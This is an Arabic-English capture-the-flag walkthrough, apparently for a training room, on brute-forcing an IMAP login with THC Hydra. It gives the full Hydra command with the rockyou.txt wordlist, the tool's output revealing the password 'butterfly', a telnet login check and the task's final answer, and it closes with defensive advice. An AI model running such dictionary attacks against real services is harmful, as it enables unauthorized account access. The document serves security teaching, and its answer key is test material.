# Task 06: Password Attack
## المهمة 06: هجمات كسر وتخمين كلمات المرور عبر THC Hydra

---

### Stage A — Original Task | تفاصيل المهمة الأصلية
* **Task Index:** Task 06
* **Original Title:** Password Attack
* **Questions:**
  1. *We learned that one of the email accounts is lazie . What is the password used to access the IMAP service on MACHINE_IP?*
* **Target Information:**
  * **Target Host:** `MACHINE_IP`
  * **Target Service:** IMAP (Port 143)
  * **Target Username:** `lazie`
  * **Wordlist:** `/usr/share/wordlists/rockyou.txt`
* **Objective:** Understand the mechanics of online network password brute-forcing, configure and execute THC Hydra against an exposed IMAP service, and recover cleartext credentials from a standard wordlist dictionary.
* **Core Concepts:** Online Password Attacks, Dictionary Attacks, THC Hydra, IMAP Authentication Protocol, Wordlists (`rockyou.txt`).

---

### Stage B — Independent Thinking | التفكير المنهجي المستقل
* **طبيعة هجمات كلمات المرور عبر الشبكة (Online Password Attacks):**
  * على عكس الهجمات غير المتصلة (Offline Cracking) التي تفك تجزئات الهاش على جهاز المهاجم دون علم الخادم، تقوم الهجمات المتصلة (Online Brute-force) بإرسال محاولات مصادقة متتالية مباشرة عبر مقبس الشبكة.
  * تحتاج هذه الهجمات إلى أدوات سريعة ومتعددة المسارات (Multi-threaded) مثل أداة **THC Hydra**.
* **تحليل استهداف خدمة IMAP:**
  * عرفنا أن حساب البريد المستهدف هو `lazie`.
  * خدمة IMAP تعمل على المنفذ 143 وتتطلب اسم مستخدم وكلمة مرور.
  * تشغيل Hydra مع تحديد اسم المستخدم الفردي `-l lazie` وقائمة كلمات المرور العالمية `-P /usr/share/wordlists/rockyou.txt` وتحديد بروتوكول الهدف `imap`.
  * تقوم Hydra بتجربة الكلمات حتى يرد الخادم برمز النجاح وتكشف كلمة المرور: **`butterfly`**.

---

### Stage C — Guided Hints | التلميحات الإرشادية المتدرجة
* **Hint 1:** استخدم أداة hydra بصيغة: `hydra -l lazie -P /usr/share/wordlists/rockyou.txt MACHINE_IP imap`.
* **Hint 2:** كلمة المرور هي كلمة إنجليزية شهيرة تعني "فراشة": `butterfly`.

---

### Stage D — Complete Practical Solution | الحل العملي والشرح التفصيلي
1. **تشغيل أداة Hydra لكسر كلمة المرور:**
   ```bash
   hydra -l lazie -P /usr/share/wordlists/rockyou.txt 10.10.x.x imap
   ```
2. **تحليل مخرجات Hydra:**
   ```text
   Hydra v9.3 (c) 2022 by van Hauser / THC - www.thc.org
   [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
   [143][imap] host: 10.10.x.x   login: lazie   password: butterfly
   1 of 1 target successfully completed, 1 valid password found
   ```
3. **التحقق اليدوي من صحة كلمة المرور عبر Telnet:**
   ```text
   telnet 10.10.x.x 143
   * OK Dovecot ready.
   a1 LOGIN lazie butterfly
   a1 OK Logged in.
   a2 LOGOUT
   * BYE Logging out
   a2 OK Logout completed.
   ```
4. كلمة المرور الصحيحة هي: **`butterfly`**.

---

### Stage E — Final Answer | الإجابة النهائية المعتمدة
* **Question 1:** *...What is the password used to access the IMAP service on MACHINE_IP?*
  * **Answer:** `butterfly`

---

### Stage F — Practical Verification & Evidence | التحقق العملي والأدلة
```text
Hydra Attack Evidence:
Target: 10.10.x.x:143 (IMAP)
Account: lazie
Recovered Credential: butterfly
Authentication Status: Confirmed (Dovecot a1 OK Logged in)
Verified Answer: butterfly
```

---

### Stage G — Key Educational Takeaway | الفائدة التعليمية المستدامة
> **قاعدة ذهبية في حماية المصادقة:**
> *"Online password attacks succeed because services allow unlimited authentication attempts; enforcing Account Lockout, Rate Limiting (e.g. Fail2ban), and Multi-Factor Authentication completely neutralizes tools like Hydra."*
